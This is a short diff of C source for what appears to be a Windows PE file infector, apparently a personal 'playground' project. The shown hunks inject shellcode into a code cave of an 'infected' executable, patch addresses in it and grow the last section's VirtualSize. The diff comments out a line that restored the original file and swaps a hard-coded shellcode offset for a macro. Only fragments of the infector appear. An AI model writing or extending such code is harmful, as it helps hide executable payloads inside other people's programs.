@@ -39,7 +39,7 @@ PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shell_c
 int main()
 {
     // Restarting the infected file to original.
-    CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);
+    //CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);
     int result = SUCCESS;
     EXE_file* infected = NULL;
     HANDLE mapping_handle = { 0 };
@@ -95,7 +95,7 @@ int main()
     if (result == ERROR)
         goto end;
     
-    memcpy((LPBYTE)codecave_address, (PCHAR)shellcode + 0x1070, shellcode_size);
+    memcpy((LPBYTE)codecave_address, (PCHAR)shellcode + SHELLCODE_ADDRESS_BUG, shellcode_size);
     set_addrress_in_shellcode(infected, codecave_address, shellcode_size);
 
     infected->last_section->Misc.VirtualSize += shellcode_size;
